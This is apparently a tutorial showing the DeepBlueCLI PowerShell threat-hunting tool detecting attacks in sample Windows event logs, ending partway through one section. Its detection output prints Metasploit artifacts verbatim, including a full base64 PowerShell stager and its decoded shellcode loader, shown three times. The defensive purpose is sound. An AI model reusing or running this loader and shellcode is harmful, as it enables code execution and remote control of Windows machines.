# DeepBlueCLI
DeepBlueCLI is a powershell module for threat hunting via Windows event logs or on ELK (Elasticsearch). This is a project by [Eric Conrad](https://twitter.com/eric_conrad)
You need to run Powershell as an administrator.
if you encounter the following error `running scripts is disabled on this system` run:

Lets see all this in action. I will be using a lab provided by [Wild West Hacking]() & [BHIS]()

### Command Syntax:

`.\DeepBlue.ps1 <event log name> <evtx filename>`

```powershell
Microsoft Windows [Version 10.0.19041.804]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\Users\adhd>cd \tools\DeepBlueCLI-master

C:\tools\DeepBlueCLI-master>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\tools\DeepBlueCLI-master> Set-ExecutionPolicy unrestricted
PS C:\tools\DeepBlueCLI-master>
```

### Available Options:

|Event|Command|
|-----|-------|
|Event log manipulation|`.\DeepBlue.ps1 .\evtx\disablestop-eventlog.evtx`|
|Metasploit native target (security)|`.\DeepBlue.ps1 .\evtx\metasploit-psexec-native-target-security.evtx`|
|Metasploit native target (system)|`.\DeepBlue.ps1 .\evtx\metasploit-psexec-native-target-system.evtx`|
|Metasploit PowerShell target (security)|` .\DeepBlue.ps1 .\evtx\metasploit-psexec-powershell-target-security.evtx`|
|Metasploit PowerShell target (system)|` .\DeepBlue.ps1 .\evtx\metasploit-psexec-powershell-target-system.evtx`|
|Mimikatz `lsadump::sam`|`.\DeepBlue.ps1 .\evtx\mimikatz-privesc-hashdump.evtx`|
|New user creation|`.\DeepBlue.ps1 .\evtx\new-user-security.evtx`|
|Obfuscation (encoding)|`.\DeepBlue.ps1 .\evtx\Powershell-Invoke-Obfuscation-encoding-menu.evtx`|
|Obfuscation (string)|`.\DeepBlue.ps1 .\evtx\Powershell-Invoke-Obfuscation-string-menu.evtx`|
|Password guessing|`.\DeepBlue.ps1 .\evtx\smb-password-guessing-security.evtx`|
|Password spraying|`.\DeepBlue.ps1 .\evtx\password-spray.evtx`|
|PowerSploit (security)|`.\DeepBlue.ps1 .\evtx\powersploit-security.evtx`|
|PowerSploit (system)|`.\DeepBlue.ps1 .\evtx\powersploit-system.evtx`|
|PSAttack|`.\DeepBlue.ps1 .\evtx\psattack-security.evtx`|
|User added to administrator group|`.\DeepBlue.ps1 .\evtx\new-user-security.evtx`|

**Hunting for Event log manipulation**

```powershell
PS C:\tools\DeepBlueCLI-master> .\DeepBlue.ps1 .\evtx\disablestop-eventlog.evtx

Security warning
Run only scripts that you trust. While scripts from the internet can be useful, this script can potentially harm your computer. If you trust this
script, use the Unblock-File cmdlet to allow the script to run without this warning message. Do you want to run
C:\tools\DeepBlueCLI-master\DeepBlue.ps1?
[D] Do not run  [R] Run once  [S] Suspend  [?] Help (default is "D"): R


Date    : 4/27/2019 3:04:51 PM
Log     : System
EventID : 7040
Message : Event Log Service Stopped
Results : Service name: Windows Event Log
          Selective event log manipulation may follow this event.
Command :
Decoded :

Date    : 4/27/2019 3:04:32 PM
Log     : System
EventID : 7040
Message : Event Log Service Started
Results : Service name: Windows Event Log
          Selective event log manipulation may precede this event.
Command :
Decoded :

PS C:\tools\DeepBlueCLI-master>
```

**Hunting for Metasploit native target (security)**

```powershell
PS C:\tools\DeepBlueCLI-master> .\DeepBlue.ps1 .\evtx\metasploit-psexec-native-target-security.evtx

Security warning
Run only scripts that you trust. While scripts from the internet can be useful, this script can potentially harm your computer. If you trust this
script, use the Unblock-File cmdlet to allow the script to run without this warning message. Do you want to run
C:\tools\DeepBlueCLI-master\DeepBlue.ps1?
[D] Do not run  [R] Run once  [S] Suspend  [?] Help (default is "D"): R


Date    : 9/20/2016 9:41:13 PM
Log     : Security
EventID : 4688
Message : Suspicious Command Line
Results : Metasploit-style cmd with pipe (possible use of Meterpreter 'getsystem')

Command : cmd.exe /c echo hgabms > \\.\pipe\hgabms
Decoded :

PS C:\tools\DeepBlueCLI-master>
```

**Metasploit native target (system)**
```powershell
PS C:\tools\DeepBlueCLI-master> .\DeepBlue.ps1 .\evtx\metasploit-psexec-native-target-system.evtx

Security warning
Run only scripts that you trust. While scripts from the internet can be useful, this script can potentially harm your computer. If you trust this
script, use the Unblock-File cmdlet to allow the script to run without this warning message. Do you want to run
C:\tools\DeepBlueCLI-master\DeepBlue.ps1?
[D] Do not run  [R] Run once  [S] Suspend  [?] Help (default is "D"): R


Date    : 9/20/2016 9:41:13 PM
Log     : System
EventID : 7045
Message : Suspicious Service Command
Results : Service name: hgabms
          Metasploit-style cmd with pipe (possible use of Meterpreter 'getsystem')

Command : cmd.exe /c echo hgabms > \\.\pipe\hgabms
Decoded :

Date    : 9/20/2016 9:41:02 PM
Log     : System
EventID : 7036
Message : Suspicious Service Name
Results : Service name: KgXItsbKgTJzdzwl
          Metasploit-style service name: 16 characters

Command :
Decoded :

Date    : 9/20/2016 9:41:02 PM
Log     : System
EventID : 7045
Message : New Service Created
Results : Service name: KgXItsbKgTJzdzwl
          Metasploit-style service name: 16 characters

Command : %SYSTEMROOT%\duKhLYUX.exe
Decoded :

Date    : 9/20/2016 9:41:02 PM
Log     : System
EventID : 7045
Message : Suspicious Service Command
Results : Service name: KgXItsbKgTJzdzwl
          Metasploit-style %SYSTEMROOT% image path (possible use of Metasploit 'Native upload' exploit payload)

Command : %SYSTEMROOT%\duKhLYUX.exe
Decoded :

PS C:\tools\DeepBlueCLI-master>
```

**Metasploit PowerShell target (security)**

```powershell
PS C:\tools\DeepBlueCLI-master> .\DeepBlue.ps1 .\evtx\metasploit-psexec-powershell-target-security.evtx

Security warning
Run only scripts that you trust. While scripts from the internet can be useful, this script can potentially harm your computer. If you trust this
script, use the Unblock-File cmdlet to allow the script to run without this warning message. Do you want to run
C:\tools\DeepBlueCLI-master\DeepBlue.ps1?
[D] Do not run  [R] Run once  [S] Suspend  [?] Help (default is "D"): R


Date    : 9/20/2016 10:35:58 AM
Log     : Security
EventID : 4688
Message : Suspicious Command Line
Results : Metasploit-style cmd with pipe (possible use of Meterpreter 'getsystem')

Command : cmd.exe /c echo genusn > \\.\pipe\genusn
Decoded :

Date    : 9/20/2016 10:35:46 AM
Log     : Security
EventID : 4688
Message : Suspicious Command Line
Results : Long Command Line: greater than 1000 bytes
          Metasploit-style base64 encoded/compressed PowerShell function (possible use of Metasploit PowerShell exploit payload)
          500+ consecutive Base64 characters
          Base64-encoded and compressed function

Command : "powershell.exe" -nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('H4sIAGFl4VcCA71WW4/aOhB+bqX+h6hCIlFZEli6N6
          nScYAAy2Vhw52iI5M4weDEbOJw6+l/PxMge2m31Z4+nAgU2zPjGX/zjSdO5FuCcl+aF8YW77iE9KRvH96/a+MAe5Kcmq0rV5uutY5mopKRUq6rcU625Yd6V3n3DvRS++uRJ32R5Al
          arUrcw9Sf3twUoyAgvjjOsxUiUBgSb8YoCWVF+kcazElAzu5mC2IJ6ZuU+jtbYXyG2UltV8TWnEhnyLdjWYNbOI4xa64YFXL669e0MjnLTbPlhwizUE6bu1AQL2szllak70rssLtb
          ETndpFbAQ+6I7ID65/lszw+xQ1qw25o0iZhzO0wrcAr4BUREgS8dzhNvcBTLaRi2A24h2w5ICNrZmr/mSyKn/IixjPSXPDl5v498QT0CckECvjJJsKYWCbNV7NuM3BNnKrfIJjn0W
          43k50ag1RaBkoG8vBJmk9sRI0fLtPJzoC9yqcDzQz4BiO8f3n947ySU8C6CVWtPLxcbhJ+TAkbvJocxgajlNg/pQf+LpGWkJvjHggc7mKa6QUSUqTSJszGZTqWUPeyagdjVM7/eI5
          cYgPreEMM1h8VJn1N7CkanbKUs9hB7+A3rSsShPintfOxRKyGW/FoOiMPI4cTZRK0FYcnpk4DYJcKIi0WMakaa/GxW9qh4tNUjymwSIAvyGEJUkGLlZTDHRMnpmt8kHiB1nKchHQ7
          QmSTaJwrvEu/xHJTSRYbDMCO1I6gnKyOZBDNiZyTkh/QkQpHgh2H6KdxmxAS1cCiS7aZKguPJX5H7oQgiC5IHZ++aK2JRzGIoMlKV2kTfmdRN/KZfBaKIGaO+CzutIRGwEgNgipgS
          AYT4mH4laxJR81aMeKB3KG6DYRdK+VQQBx5hl9jpH6NMCH9kd4xHAsSzGCHJJuMiI/VpIOCOiLE9cunPg3h2RxzCKQbklBQ5qZyJvhMxz1MMF+dHfp4wOiASCEDDCLin45BcFEwRA
          FbyR/WOFhE8o5rPmpa+pDm0oblaE/49el7jpUu7fruoqkFpO3dQLaw1q+1Sp1otrG/NfkGY5Zqot2uiWR4uFiaq3vdGYlxD1S7VlqPCfnVL92YD2aOterHX9xtN3+4Xru2MSo7jXj
          rmfe6zQRuDYkfX8rhRKkeNgb7RtUJYpptqh/Y6y1tDzEZ9hnuO6g5z15huG8Gin+PNfQ2hyvzc2t86/cq8ae9GVfV6UFiiMkJFv9w3dF4f6QFqq33s9vmmvqiwgVtEumFRMu70DL3
          TMXTUqyweSteqC7ZDPNcH/Twdr4b3c5gbEEJd1Qo1m+z5qAMgVTjC7j3ouMW8NXdAp/QJ6Z9aPMzjpc6RDjrG+AHiGq2MNgN5t5fnqM9aQ4wa452hqrlRu4CqGh1UXBRviV29g1G4
          Lu1Laq5vc3vwuTVy1P6QXaqlYndlOaqqbqqlujXOba/uLgu69lD0qMdmeVu97l3p/qbutteu3Rlc3m9buxn466lq/2PMGqBNavHZu9IuF8/o8Ktrv4mDcI4Z0ATu86RQDR4Ypyu5z
          WlsIcvPuvWSBD5h0Nyg/SV8R4xxK+4TL65w6FXHDjKF4u3B8Dz/6kiRHhWVpz6SLN3cjCFmqKMjybMN4rtintG255oG97+2LWhw8LeftMhXO/m0WSbuIAleTy7YwYUSl1hqMdg0L5
          bV1f+B5qnE5/Cy34rm09pvpG9CWMs8IvGT5OXCf8L7D7EYYCpA34Qri5FjA/09JCcuPfsQSVIHXHFOT/wxeBeJsxZ8o/wLs66tlosKAAA='));IEX (New-Object
          IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
Decoded : function h4ZcoQgeeU {
                Param ($bvG8wTcvubtG, $gg0ooexEqKT)
                $z9Ym = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And
          $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

                return $z9Ym.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object
          System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($z9Ym.GetMethod('GetModuleHandle')).Invoke($null, @($bvG8wTcvubtG)))),
          $gg0ooexEqKT))
          }

          function m6rpNzi7jwAa {
                Param (
                        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $dXTSrtyK,
                        [Parameter(Position = 1)] [Type] $zFtXvo = [Void]
                )

                $clqy = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
          [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class,
          Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
                $clqy.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard,
          $dXTSrtyK).SetImplementationFlags('Runtime, Managed')
                $clqy.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $zFtXvo, $dXTSrtyK).SetImplementationFlags('Runtime, Managed')

                return $clqy.CreateType()
          }

          [Byte[]]$laChqy = [System.Convert]::FromBase64String("/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYt
          ZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYH/9W4kAEAACnEVFBo
          KYBrAP/VagVowKjGlWgCABFcieZQUFBQQFBAUGjqD9/g/9WXahBWV2iZpXRh/9WFwHQK/04IdezoYQAAAGoAagRWV2gC2chf/9WD+AB+Nos2akBoABAAAFZqAGhYpFPl/9WTU2oAV
          lNXaALZyF//1YP4AH0iWGgAQAAAagBQaAsvDzD/1VdodW5NYf/VXl7/DCTpcf///wHDKcZ1x8O74B0qCmimlb2d/9U8BnwKgPvgdQW7RxNyb2oAU//V")

          $j5m807j = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((h4ZcoQgeeU kernel32.dll VirtualAlloc), (m6rpNzi7jwAa
          @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $laChqy.Length,0x3000, 0x40)
          [System.Runtime.InteropServices.Marshal]::Copy($laChqy, 0, $j5m807j, $laChqy.length)

          $jWwM6kHp = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((h4ZcoQgeeU kernel32.dll CreateThread),
          (m6rpNzi7jwAa @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr])
          ([IntPtr]))).Invoke([IntPtr]::Zero,0,$j5m807j,[IntPtr]::Zero,0,[IntPtr]::Zero)
          [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((h4ZcoQgeeU kernel32.dll WaitForSingleObject), (m6rpNzi7jwAa
          @([IntPtr], [Int32]))).Invoke($jWwM6kHp,0xffffffff) | Out-Null

Date    : 9/20/2016 10:35:46 AM
Log     : Security
EventID : 4688
Message : Suspicious Command Line
Results : Long Command Line: greater than 1000 bytes
          Metasploit-style base64 encoded/compressed PowerShell function (possible use of Metasploit PowerShell exploit payload)
          500+ consecutive Base64 characters
          Base64-encoded and compressed function

Command : powershell.exe  -nop -w hidden -c if([IntPtr]::Size -eq
          4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object
          System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64St
          ring(''H4sIAGFl4VcCA71WW4/aOhB+bqX+h6hCIlFZEli6N6nScYAAy2Vhw52iI5M4weDEbOJw6+l/PxMge2m31Z4+nAgU2zPjGX/zjSdO5FuCcl+aF8YW77iE9KRvH96/a+MAe5
          Kcmq0rV5uutY5mopKRUq6rcU625Yd6V3n3DvRS++uRJ32R5AlarUrcw9Sf3twUoyAgvjjOsxUiUBgSb8YoCWVF+kcazElAzu5mC2IJ6ZuU+jtbYXyG2UltV8TWnEhnyLdjWYNbOI4
          xa64YFXL669e0MjnLTbPlhwizUE6bu1AQL2szllak70rssLtbETndpFbAQ+6I7ID65/lszw+xQ1qw25o0iZhzO0wrcAr4BUREgS8dzhNvcBTLaRi2A24h2w5ICNrZmr/mSyKn/Iix
          jPSXPDl5v498QT0CckECvjJJsKYWCbNV7NuM3BNnKrfIJjn0W43k50ag1RaBkoG8vBJmk9sRI0fLtPJzoC9yqcDzQz4BiO8f3n947ySU8C6CVWtPLxcbhJ+TAkbvJocxgajlNg/pQ
          f+LpGWkJvjHggc7mKa6QUSUqTSJszGZTqWUPeyagdjVM7/eI5cYgPreEMM1h8VJn1N7CkanbKUs9hB7+A3rSsShPintfOxRKyGW/FoOiMPI4cTZRK0FYcnpk4DYJcKIi0WMakaa/G
          xW9qh4tNUjymwSIAvyGEJUkGLlZTDHRMnpmt8kHiB1nKchHQ7QmSTaJwrvEu/xHJTSRYbDMCO1I6gnKyOZBDNiZyTkh/QkQpHgh2H6KdxmxAS1cCiS7aZKguPJX5H7oQgiC5IHZ++
          aK2JRzGIoMlKV2kTfmdRN/KZfBaKIGaO+CzutIRGwEgNgipgSAYT4mH4laxJR81aMeKB3KG6DYRdK+VQQBx5hl9jpH6NMCH9kd4xHAsSzGCHJJuMiI/VpIOCOiLE9cunPg3h2RxzC
          KQbklBQ5qZyJvhMxz1MMF+dHfp4wOiASCEDDCLin45BcFEwRAFbyR/WOFhE8o5rPmpa+pDm0oblaE/49el7jpUu7fruoqkFpO3dQLaw1q+1Sp1otrG/NfkGY5Zqot2uiWR4uFiaq3
          vdGYlxD1S7VlqPCfnVL92YD2aOterHX9xtN3+4Xru2MSo7jXjrmfe6zQRuDYkfX8rhRKkeNgb7RtUJYpptqh/Y6y1tDzEZ9hnuO6g5z15huG8Gin+PNfQ2hyvzc2t86/cq8ae9GVf
          V6UFiiMkJFv9w3dF4f6QFqq33s9vmmvqiwgVtEumFRMu70DL3TMXTUqyweSteqC7ZDPNcH/Twdr4b3c5gbEEJd1Qo1m+z5qAMgVTjC7j3ouMW8NXdAp/QJ6Z9aPMzjpc6RDjrG+AH
          iGq2MNgN5t5fnqM9aQ4wa452hqrlRu4CqGh1UXBRviV29g1G4Lu1Laq5vc3vwuTVy1P6QXaqlYndlOaqqbqqlujXOba/uLgu69lD0qMdmeVu97l3p/qbutteu3Rlc3m9buxn466lq
          /2PMGqBNavHZu9IuF8/o8Ktrv4mDcI4Z0ATu86RQDR4Ypyu5zWlsIcvPuvWSBD5h0Nyg/SV8R4xxK+4TL65w6FXHDjKF4u3B8Dz/6kiRHhWVpz6SLN3cjCFmqKMjybMN4rtintG25
          5oG97+2LWhw8LeftMhXO/m0WSbuIAleTy7YwYUSl1hqMdg0L5bV1f+B5qnE5/Cy34rm09pvpG9CWMs8IvGT5OXCf8L7D7EYYCpA34Qri5FjA/09JCcuPfsQSVIHXHFOT/wxeBeJsx
          Z8o/wLs66tlosKAAA=''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompre
          ss))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.
          Diagnostics.Process]::Start($s);
Decoded : function h4ZcoQgeeU {
                Param ($bvG8wTcvubtG, $gg0ooexEqKT)
                $z9Ym = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And
          $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

                return $z9Ym.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object
          System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($z9Ym.GetMethod('GetModuleHandle')).Invoke($null, @($bvG8wTcvubtG)))),
          $gg0ooexEqKT))
          }

          function m6rpNzi7jwAa {
                Param (
                        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $dXTSrtyK,
                        [Parameter(Position = 1)] [Type] $zFtXvo = [Void]
                )

                $clqy = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
          [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class,
          Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
                $clqy.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard,
          $dXTSrtyK).SetImplementationFlags('Runtime, Managed')
                $clqy.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $zFtXvo, $dXTSrtyK).SetImplementationFlags('Runtime, Managed')

                return $clqy.CreateType()
          }

          [Byte[]]$laChqy = [System.Convert]::FromBase64String("/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYt
          ZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYH/9W4kAEAACnEVFBo
          KYBrAP/VagVowKjGlWgCABFcieZQUFBQQFBAUGjqD9/g/9WXahBWV2iZpXRh/9WFwHQK/04IdezoYQAAAGoAagRWV2gC2chf/9WD+AB+Nos2akBoABAAAFZqAGhYpFPl/9WTU2oAV
          lNXaALZyF//1YP4AH0iWGgAQAAAagBQaAsvDzD/1VdodW5NYf/VXl7/DCTpcf///wHDKcZ1x8O74B0qCmimlb2d/9U8BnwKgPvgdQW7RxNyb2oAU//V")

          $j5m807j = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((h4ZcoQgeeU kernel32.dll VirtualAlloc), (m6rpNzi7jwAa
          @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $laChqy.Length,0x3000, 0x40)
          [System.Runtime.InteropServices.Marshal]::Copy($laChqy, 0, $j5m807j, $laChqy.length)

          $jWwM6kHp = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((h4ZcoQgeeU kernel32.dll CreateThread),
          (m6rpNzi7jwAa @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr])
          ([IntPtr]))).Invoke([IntPtr]::Zero,0,$j5m807j,[IntPtr]::Zero,0,[IntPtr]::Zero)
          [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((h4ZcoQgeeU kernel32.dll WaitForSingleObject), (m6rpNzi7jwAa
          @([IntPtr], [Int32]))).Invoke($jWwM6kHp,0xffffffff) | Out-Null

Date    : 9/20/2016 10:35:46 AM
Log     : Security
EventID : 4688
Message : Suspicious Command Line
Results : Long Command Line: greater than 1000 bytes
          Metasploit-style base64 encoded/compressed PowerShell function (possible use of Metasploit PowerShell exploit payload)
          500+ consecutive Base64 characters
          Base64-encoded and compressed function

Command : C:\Windows\system32\cmd.exe /b /c start /b /min powershell.exe -nop -w hidden -c if([IntPtr]::Size -eq
          4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object
          System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64St
          ring(''H4sIAGFl4VcCA71WW4/aOhB+bqX+h6hCIlFZEli6N6nScYAAy2Vhw52iI5M4weDEbOJw6+l/PxMge2m31Z4+nAgU2zPjGX/zjSdO5FuCcl+aF8YW77iE9KRvH96/a+MAe5
          Kcmq0rV5uutY5mopKRUq6rcU625Yd6V3n3DvRS++uRJ32R5AlarUrcw9Sf3twUoyAgvjjOsxUiUBgSb8YoCWVF+kcazElAzu5mC2IJ6ZuU+jtbYXyG2UltV8TWnEhnyLdjWYNbOI4
          xa64YFXL669e0MjnLTbPlhwizUE6bu1AQL2szllak70rssLtbETndpFbAQ+6I7ID65/lszw+xQ1qw25o0iZhzO0wrcAr4BUREgS8dzhNvcBTLaRi2A24h2w5ICNrZmr/mSyKn/Iix
          jPSXPDl5v498QT0CckECvjJJsKYWCbNV7NuM3BNnKrfIJjn0W43k50ag1RaBkoG8vBJmk9sRI0fLtPJzoC9yqcDzQz4BiO8f3n947ySU8C6CVWtPLxcbhJ+TAkbvJocxgajlNg/pQ
          f+LpGWkJvjHggc7mKa6QUSUqTSJszGZTqWUPeyagdjVM7/eI5cYgPreEMM1h8VJn1N7CkanbKUs9hB7+A3rSsShPintfOxRKyGW/FoOiMPI4cTZRK0FYcnpk4DYJcKIi0WMakaa/G
          xW9qh4tNUjymwSIAvyGEJUkGLlZTDHRMnpmt8kHiB1nKchHQ7QmSTaJwrvEu/xHJTSRYbDMCO1I6gnKyOZBDNiZyTkh/QkQpHgh2H6KdxmxAS1cCiS7aZKguPJX5H7oQgiC5IHZ++
          aK2JRzGIoMlKV2kTfmdRN/KZfBaKIGaO+CzutIRGwEgNgipgSAYT4mH4laxJR81aMeKB3KG6DYRdK+VQQBx5hl9jpH6NMCH9kd4xHAsSzGCHJJuMiI/VpIOCOiLE9cunPg3h2RxzC
          KQbklBQ5qZyJvhMxz1MMF+dHfp4wOiASCEDDCLin45BcFEwRAFbyR/WOFhE8o5rPmpa+pDm0oblaE/49el7jpUu7fruoqkFpO3dQLaw1q+1Sp1otrG/NfkGY5Zqot2uiWR4uFiaq3
          vdGYlxD1S7VlqPCfnVL92YD2aOterHX9xtN3+4Xru2MSo7jXjrmfe6zQRuDYkfX8rhRKkeNgb7RtUJYpptqh/Y6y1tDzEZ9hnuO6g5z15huG8Gin+PNfQ2hyvzc2t86/cq8ae9GVf
          V6UFiiMkJFv9w3dF4f6QFqq33s9vmmvqiwgVtEumFRMu70DL3TMXTUqyweSteqC7ZDPNcH/Twdr4b3c5gbEEJd1Qo1m+z5qAMgVTjC7j3ouMW8NXdAp/QJ6Z9aPMzjpc6RDjrG+AH
          iGq2MNgN5t5fnqM9aQ4wa452hqrlRu4CqGh1UXBRviV29g1G4Lu1Laq5vc3vwuTVy1P6QXaqlYndlOaqqbqqlujXOba/uLgu69lD0qMdmeVu97l3p/qbutteu3Rlc3m9buxn466lq
          /2PMGqBNavHZu9IuF8/o8Ktrv4mDcI4Z0ATu86RQDR4Ypyu5zWlsIcvPuvWSBD5h0Nyg/SV8R4xxK+4TL65w6FXHDjKF4u3B8Dz/6kiRHhWVpz6SLN3cjCFmqKMjybMN4rtintG25
          5oG97+2LWhw8LeftMhXO/m0WSbuIAleTy7YwYUSl1hqMdg0L5bV1f+B5qnE5/Cy34rm09pvpG9CWMs8IvGT5OXCf8L7D7EYYCpA34Qri5FjA/09JCcuPfsQSVIHXHFOT/wxeBeJsx
          Z8o/wLs66tlosKAAA=''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompre
          ss))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.
          Diagnostics.Process]::Start($s);
Decoded : function h4ZcoQgeeU {
                Param ($bvG8wTcvubtG, $gg0ooexEqKT)
                $z9Ym = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And
          $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

                return $z9Ym.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object
          System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($z9Ym.GetMethod('GetModuleHandle')).Invoke($null, @($bvG8wTcvubtG)))),
          $gg0ooexEqKT))
          }

          function m6rpNzi7jwAa {
                Param (
                        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $dXTSrtyK,
                        [Parameter(Position = 1)] [Type] $zFtXvo = [Void]
                )

                $clqy = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
          [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class,
          Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
                $clqy.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard,
          $dXTSrtyK).SetImplementationFlags('Runtime, Managed')
                $clqy.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $zFtXvo, $dXTSrtyK).SetImplementationFlags('Runtime, Managed')

                return $clqy.CreateType()
          }

          [Byte[]]$laChqy = [System.Convert]::FromBase64String("/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYt
          ZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYH/9W4kAEAACnEVFBo
          KYBrAP/VagVowKjGlWgCABFcieZQUFBQQFBAUGjqD9/g/9WXahBWV2iZpXRh/9WFwHQK/04IdezoYQAAAGoAagRWV2gC2chf/9WD+AB+Nos2akBoABAAAFZqAGhYpFPl/9WTU2oAV
          lNXaALZyF//1YP4AH0iWGgAQAAAagBQaAsvDzD/1VdodW5NYf/VXl7/DCTpcf///wHDKcZ1x8O74B0qCmimlb2d/9U8BnwKgPvgdQW7RxNyb2oAU//V")

          $j5m807j = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((h4ZcoQgeeU kernel32.dll VirtualAlloc), (m6rpNzi7jwAa
          @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $laChqy.Length,0x3000, 0x40)
          [System.Runtime.InteropServices.Marshal]::Copy($laChqy, 0, $j5m807j, $laChqy.length)

          $jWwM6kHp = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((h4ZcoQgeeU kernel32.dll CreateThread),
          (m6rpNzi7jwAa @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr])
          ([IntPtr]))).Invoke([IntPtr]::Zero,0,$j5m807j,[IntPtr]::Zero,0,[IntPtr]::Zero)
          [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((h4ZcoQgeeU kernel32.dll WaitForSingleObject), (m6rpNzi7jwAa
          @([IntPtr], [Int32]))).Invoke($jWwM6kHp,0xffffffff) | Out-Null



PS C:\tools\DeepBlueCLI-master>
```

**Metasploit PowerShell target (system)**

```powershell
PS C:\tools\DeepBlueCLI-master> .\DeepBlue.ps1 .\evtx\metasploit-psexec-powershell-target-system.evtx

Security warning
Run only scripts that you trust. While scripts from the internet can be useful, this script can potentially harm your computer. If you trust this
script, use the Unblock-File cmdlet to allow the script to run without this warning message. Do you want to run
